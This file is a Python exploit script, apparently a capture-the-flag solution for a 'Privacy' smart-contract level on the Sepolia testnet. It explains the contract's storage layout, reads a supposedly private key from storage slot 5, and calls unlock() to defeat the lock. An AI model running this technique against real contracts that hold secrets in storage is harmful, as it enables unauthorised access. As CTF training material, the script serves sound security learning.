#!/usr/bin/python3
from ape import accounts, project, networks
from rich.console import Console

# sepolia: 0x696e476c24705Ee4635A9548503e70c8DA3f5d8f
ADDRESS = "0x696e476c24705Ee4635A9548503e70c8DA3f5d8f"

console = Console()
"""
- locked is 1 byte bool in slot 0
- ID is a 32 byte uint256. It is 1 byte extra big to be inserted in slot 0. So it goes in & totally fills slot 1
flattening - a 1 byte uint8, denomination - a 1 byte uint8 and awkwardness - a 2 byte uint16 totals 4 bytes. So, 
all three of these go into slot 2
- Array data always start a new slot, so data starts from slot 3. 
- Since it is bytes32 array each value takes 32 bytes. Hence value at index 0 is stored in slot 3, index 1 is stored 
in slot 4 and index 2 value goes into slot 5
"""


def attack():
    attacker = accounts.load("ctf")
    attacker.set_autosign(True)
    target_contract = project.Privacy.at(ADDRESS)

    console.print(f"[green]Locked: [magenta]{target_contract.locked()}")
    #* We only need the first 16 byts of the key bcz of the bytes16 typecast
    key = networks.provider.get_storage_at(ADDRESS, 5)[:16].hex()
    key_bytes = bytes.fromhex(key[2:])

    target_contract.unlock(key, sender=attacker)


    console.print(f"[green]Locked: [magenta]{target_contract.locked()}")

    assert target_contract.locked() is False



def main():
    attack()


if __name__ == "__main__":
    main()
